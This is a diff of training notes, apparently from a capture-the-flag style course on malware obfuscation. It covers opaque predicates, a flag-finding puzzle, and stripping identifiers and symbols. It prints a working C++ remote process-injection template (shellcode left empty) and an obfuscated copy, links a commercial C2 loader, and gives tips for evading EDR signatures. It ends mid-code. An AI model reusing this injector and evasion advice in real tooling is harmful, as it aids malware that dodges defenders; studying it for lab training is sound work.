@@ -198,3 +198,203 @@ In the upcoming task, we will discuss different control flow patterns an attacke
 Can logic change and impact the control flow of a program? (T/F)
 *T*
 ### Arbitrary Control Flow Patterns
+To craft arbitrary control flow patterns we can leverage maths, logic, and/or other complex algorithms to inject a different control flow into a malicious function.
+We can leverage predicates to craft these complex logic and/or mathematical algorithms. Predicates refer to the decision-making of an input function to return true or false. Breaking this concept down at a high level, we can think of a predicate similar to the condition an if statement uses to determine if a code block will be executed or not, as seen in the example in the previous task.
+Applying this concept to obfuscation, opaque predicates are used to control a known output and input. The paper, Opaque Predicate: Attack and Defense in Obfuscated Binary Code, states, “An opaque predicate is a predicate whose value is known to the obfuscator but is difficult to deduce. It can be seamlessly applied with other obfuscation methods such as junk code to turn reverse engineering attempts into arduous work.” Opaque predicates fall under the bogus control flow and probabilistic control flow methods of the taxonomy paper; they can be used to arbitrarily add logic to a program or refactor the control flow of a pre-existing function.
+https://etda.libraries.psu.edu/files/final_submissions/17513
+The topic of opaque predicates requires a deeper understanding of mathematics and computing principles, so we will not cover it in-depth, but we will observe one common example.
+The Collatz Conjecture is a common mathematical problem that can be used as an example of an opaque predicate. It states: If two arithmetic operations are repeated, they will return one from every positive integer. The fact that we know it will always output one for a known input (a positive integer) means it is a viable opaque predicate. For more information about the Collatz conjecture, refer to the Collatz Problem. Below is an example of the Collatz conjecture applied in Python.
+https://mathworld.wolfram.com/CollatzProblem.html
+```text
+x = 0
+while(x > 1):
+	if(x%2==1):
+		x=x*3+1
+	else:
+		x=x/2
+	if(x==1):
+		print("hello!")
+```
+In the above code snippet, the Collatz conjecture will only perform its mathematical operations if x > 1, resulting in 1 or TRUE. From the definition of the Collatz problem, it will always return one for a positive integer input, so the statement will always return true if x is a positive integer greater than one.
+To prove the efficacy of this opaque predicate, we can observe its CFG (Control Flow Graph) to the right. If this is what an interpreted function looks like, just imagine what a compiled function may look like to an analyst.
+Using the knowledge you have accrued throughout this task, put yourself into the shoes of an analyst and attempt to decode the original function and output of the code snippet below.
+If you correctly follow the print statements, it will result in a flag you can submit.
+```text
+x = 3
+swVar = 1
+a = 112340857612345
+b = 1122135047612359087
+i = 0
+case_1 = ["T","d","4","3","3","3","e","1","g","w","p","y","8","4"]
+case_2 = ["1a","H","3a","4a","5a","3","7a","8a","d","10a","11a","12a","!","14a"]
+case_3 = ["1b","2b","M","4b","5b","6b","c","8b","9b","3","11b","12b","13b","14b"]
+case_4 = ["1c","2c","3c","{","5c","6c","7c","8c","9c","10c","d","12c","13c","14c"]
+case_5 = ["1d","2d","3d","4d","D","6d","7d","o","9d","10d","11d","!","13d","14d"]
+case_6 = ["1e","2e","3e","4e","5e","6e","7e","8e","9e","10e","11e","12e","13e","}"]
+
+while (x > 1):
+    if (x % 2 == 1):
+        x = x * 3 + 1
+    else:
+        x = x / 2
+    if (x == 1):
+        for y in case_1:
+            match swVar:
+                case 1:
+                    print(case_1[i])
+                    a = 2
+                    b = 214025
+                    swVar = 2
+                case 2:
+                    print(case_2[i])
+                    if (a > 10):
+                        swVar = 6
+                    else:
+                        swVar = 3
+                case 3:
+                    print(case_3[i])
+                    b = b + a
+                    if (b < 10):
+                        swVar = 5
+                    else:
+                        swVar = 4
+                case 4:
+                    print(case_4[i])
+                    b -= b
+                    swVar = 5
+                case 5:
+                    print(case_5[i])
+                    a += a
+                    swVar = 2
+                case 6:
+                    print(case_5[11])
+                    print(case_6[i])
+                    break
+            i = i + 1
+```
+![[Pasted image 20220916202903.png]]
+What flag is found after properly reversing the provided snippet?
+### Protecting and Stripping Identifiable Information
+﻿Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), an analyst has, the better chance an attacker has they won't be able to reconstruct its original function.
+At a high level, we should consider three different types of identifiable data: code structure, object names, and file/compilation properties. In this task, we will break down the core concepts of each and a case study of a practical approach to each.
+Object Names
+Object names offer some of the most significant insight into a program's functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function.
+The importance of literal object names may change depending on if the language is compiled  or interpreted. If an interpreted language such as Python or PowerShell is used, then all objects matter and must be modified. If a compiled language such as C or C# is used, only objects appearing in the strings are generally significant. An object may appear in the strings by any function that produces an IO operation.
+The aforementioned white paper: Layered Obfuscation Taxonomy, summarizes these practices well under the code-element layer’s meaningless identifiers method.
+Below we will observe two basic examples of replacing meaningful identifiers for both an interpreted and compiled language.
+As an example of a compiled language, we can observe a process injector written in C++ that reports its status to the command line.
+```text
+#include "windows.h"
+#include <iostream>
+#include <string>
+using namespace std;
+
+int main(int argc, char* argv[])
+{
+	unsigned char shellcode[] = "";
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+	string leaked = "This was leaked in the strings";
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	cout << "Handle obtained for" << processHandle;
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	cout << "Buffer Created";
+	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+	cout << "Process written with buffer" << remoteBuffer;
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
+	cout << "Closing handle" << processHandle;
+	cout << leaked;
+
+	return 0;
+}
+```
+Let’s use strings to see exactly what was leaked when this source code is compiled.
+```text
+C:\>.\strings.exe "\Injector.exe"
+
+Strings v2.54 - Search for ANSI and Unicode strings in binary images.
+Copyright (C) 1999-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+!This program cannot be run in DOS mode.
+>FU
+z';
+z';
+...
+[snip]
+...
+Y_^[
+leaked
+shellcode
+2_^[]
+...
+[snip]
+...
+std::_Adjust_manually_vector_aligned
+"invalid argument"
+string too long
+This was leaked in the strings
+Handle obtained for
+Buffer Created
+Process written with buffer
+Closing handle
+std::_Allocate_manually_vector_aligned
+bad allocation
+Stack around the variable '
+...
+[snip]
+...
+8@9H9T9X9\\9h9|9
+:$:(:D:H:
+@1p1
+```
+Notice that all of the iostream was written to strings, and even the shellcode byte array was leaked. This is a smaller program, so imagine what a fleshed-out and un-obfuscated program would look like!
+We can remove comments and replace the meaningful identifiers to resolve this problem.
+```text
+#include "windows.h"
+
+int main(int argc, char* argv[])
+{
+	unsigned char awoler[] = "";
+
+	HANDLE awerfu;
+	HANDLE rwfhbf;
+	PVOID iauwef;
+
+	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
+	rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
+	CloseHandle(awerfu);
+
+	return 0;
+}
+```
+We should no longer have any identifiable string information, and the program is safe from string analysis.
+As an example for an interpreted language we can observe the deprecated Badger PowerShell loader from the BRC4 Community Kit.
+https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1
+You may notice that some cmdlets and functions are kept in their original state… why is that? Depending on your objectives, you may want to create an application that can still confuse reverse engineers after detection but may not look immediately suspicious. If a malware developer were to obfuscate all cmdlets and functions, it would raise the entropy in both interpreted and compiled languages resulting in higher EDR alert scores. It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly random or visibly heavily obfuscated.
+Code Structure
+Code structure can be a bothersome problem when dealing with all aspects of malicious code that are often overlooked and not easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures or easier reverse engineering from an analyst.
+As covered in the aforementioned taxonomy paper, junk code and reordering code are both widely used as additional measures to add complexity to an interpreted program. Because the program is not compiled, an analyst has much greater insight into the program, and if not artificially inflated with complexity, they can focus on the exact malicious functions of an application.
+Separation of related code can impact both interpreted and compiled languages and result in hidden signatures that may be hard to identify. A heuristic signature engine may determine whether a program is malicious based on the surrounding functions or API calls. To circumvent these signatures, an attacker can randomize the occurrence of related code to fool the engine into believing it is a safe call or function.
+File & Compilation Properties
+More minor aspects of a compiled binary, such as the compilation method, may not seem like a critical component, but they can lead to several advantages to assist an analyst. For example, if a program is compiled as a debug build, an analyst can obtain all the available global variables and other program information.
+The compiler will include a symbol file when a program is compiled as a debug build. Symbols commonly aid in debugging a binary image and can contain global and local variables, function names, and entry points. Attackers must be aware of these possible problems to ensure proper compilation practices and that no information is leaked to an analyst.
+Luckily for attackers, symbol files are easily removed through the compiler or after compilation. To remove symbols from a compiler like Visual Studio, we need to change the compilation target from Debug to Release or use a lighter-weight compiler like mingw.
+If we need to remove symbols from a pre-compiled image, we can use the command-line utility: strip.
+The aforementioned white paper: Layered Obfuscation Taxonomy, summarizes these practices well under the code-element layer’s stripping redundant symbols method.
+Below is an example of using strip to remove the symbols from a binary compiled in gcc with debugging enabled.
+Several other properties should be considered before actively using a tool, such as entropy or hash. These concepts are covered in task 5 of the Signature Evasion room.
+Using the knowledge you have accrued throughout this task, remove any meaningful identifiers or debug information from the C++ source code below using the AttackBox or your own virtual machine.
+Once adequately obfuscated and stripped compile the source code using MingW32-G++ and submit it to the webserver at http://10.10.92.241/.
+Note: the file name must be challenge-8.exe to receive the flag.
+```text
+#include "windows.h"
+#include <iostream>
+#include <string>
+using namespace std;
